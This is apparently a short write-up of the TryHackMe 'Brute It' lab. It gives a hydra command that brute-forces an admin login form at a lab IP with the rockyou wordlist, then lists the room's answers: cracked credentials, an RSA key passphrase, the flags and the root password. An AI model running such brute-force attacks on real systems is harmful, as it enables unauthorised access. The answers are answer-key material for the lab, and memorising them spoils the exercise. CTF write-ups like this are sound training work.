#TryHackMm Brute IT

Saikat Karmakar | Nov 9:2020 

Task 1 & Task 2 easy basic deploy & namp scan.

#Task 3
1.What is the user:password of the admin panel?
command:
hydra -l admin -P ~/Desktop/rockyou.txt -t 32 10.10.212.227 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=invalid" -V
```
admin:xavier

```
2.Crack the RSA key you found.What is John's RSA Private Key passphrase?
```
rockinroll
```
THM{brut3_f0rce_is_e4sy} // a flag in the RSA page
3.user.txt
```
THM{a_password_is_not_a_barrier}
```
3.root password
```
football
```
3.root flag.txt
```
THM{pr1v1l3g3_3sc4l4t10n}

```

